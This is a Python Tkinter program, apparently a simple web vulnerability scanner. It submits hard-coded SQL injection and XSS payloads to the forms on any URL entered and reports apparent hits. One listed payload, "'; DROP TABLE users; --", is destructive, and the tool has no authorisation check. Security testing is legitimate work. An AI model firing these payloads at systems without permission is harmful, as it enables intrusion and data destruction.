import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import tkinter as tk
from tkinter import messagebox, scrolledtext, ttk
import threading

# ======= Enhanced payloads for SQL Injection and XSS =======
SQL_PAYLOADS = [
    "' OR '1'='1 --", "' OR 1=1#", "' UNION SELECT NULL,NULL --",
    "admin' --", "'; DROP TABLE users; --"
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert('XSS')>",
    "\"><script>alert('test')</script>", "<svg/onload=alert('XSS')>"
]

# ======= Core scanning functions =======
def get_all_forms(url):
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.content, "html.parser")
        return soup.find_all("form")
    except Exception:
        return []

def get_form_details(form):
    details = {"action": form.attrs.get("action", "").lower(),
               "method": form.attrs.get("method", "get").lower(),
               "inputs": []}
    for input_tag in form.find_all("input"):
        name = input_tag.attrs.get("name")
        if name:
            details["inputs"].append({
                "type": input_tag.attrs.get("type", "text"),
                "name": name,
                "value": input_tag.attrs.get("value", "")
            })
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        data[input["name"]] = value if input["type"] == "text" else input["value"]
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, timeout=5)
        return requests.get(target_url, params=data, timeout=5)
    except Exception:
        return None

def scan_sql_injection(url):
    report = ""
    forms = get_all_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in SQL_PAYLOADS:
            response = submit_form(details, url, payload)
            if response and any(err in response.text.lower() for err in ["sql", "mysql", "syntax", "error in your"]):
                report += f"[!] SQL Injection vulnerability found!\nURL: {url}\nPayload: {payload}\nForm: {details['action']}\n\n"
    return report or "[+] No SQL Injection vulnerabilities found.\n\n"

def scan_xss(url):
    report = ""
    forms = get_all_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(details, url, payload)
            if response and payload in response.text:
                report += f"[!] XSS vulnerability found!\nURL: {url}\nPayload: {payload}\nForm: {details['action']}\n\n"
    return report or "[+] No XSS vulnerabilities found.\n\n"

# ======= Scan thread handler =======
def start_scan_thread(url, output_text, progress_bar, status_labels, scan_btn):
    def task():
        output_text.delete(1.0, tk.END)
        progress_bar["value"] = 0
        scan_btn.config(state=tk.DISABLED)
        output_text.insert(tk.END, f"[*] Scanning URL: {url}\n\n")

        output_text.insert(tk.END, "[*] Running SQL Injection Scan...\n")
        sql_result = scan_sql_injection(url)
        output_text.insert(tk.END, sql_result)
        progress_bar["value"] = 50
        progress_bar.update()

        output_text.insert(tk.END, "[*] Running XSS Scan...\n")
        xss_result = scan_xss(url)
        output_text.insert(tk.END, xss_result)
        progress_bar["value"] = 100
        progress_bar.update()

        status_labels["done"].config(text="Scan Complete!")
        scan_btn.config(state=tk.NORMAL)
    threading.Thread(target=task, daemon=True).start()

# ======= GUI Setup =======
root = tk.Tk()
root.title("Web Application Vulnerability Scanner")
root.geometry("1000x600")
root.configure(bg="#1B1F3B")

# Left control panel
left_panel = tk.Frame(root, bg="#2D325A", width=260)
left_panel.pack(side=tk.LEFT, fill=tk.Y)

tk.Label(left_panel, text="Vuln Scanner", font=("Arial Black", 18),
         fg="#F1FAEE", bg="#2D325A").pack(pady=20)

tk.Label(left_panel, text="Target URL:", font=("Segoe UI", 11, "bold"),
         fg="#F1FAEE", bg="#2D325A").pack(pady=5)
url_entry = tk.Entry(left_panel, width=30, font=("Segoe UI", 11),
                     bg="#F1FAEE", fg="#1B1F3B")
url_entry.pack(pady=5, padx=15)

scan_btn = tk.Button(left_panel, text="Start Scan", bg="#E63946", fg="white",
                     font=("Segoe UI", 11, "bold"), relief="flat", width=18,
                     command=lambda: start_scan_thread(
                         url_entry.get().strip(), output_text,
                         progress_bar, status_labels, scan_btn))
scan_btn.pack(pady=15)

progress_bar = ttk.Progressbar(left_panel, orient="horizontal", length=200, mode="determinate")
progress_bar.pack(pady=10)

status_labels = {
    "done": tk.Label(left_panel, text="", fg="#06D6A0", bg="#2D325A", font=("Segoe UI", 10, "bold"))
}
status_labels["done"].pack(pady=5)

# Right output panel
right_panel = tk.Frame(root, bg="#1B1F3B")
right_panel.pack(side=tk.RIGHT, expand=True, fill=tk.BOTH)

output_text = scrolledtext.ScrolledText(right_panel, wrap=tk.WORD, width=90, height=30,
                                        font=("Courier New", 10), bg="#F1FAEE", fg="#1B1F3B")
output_text.pack(padx=20, pady=20, expand=True, fill=tk.BOTH)

root.mainloop()
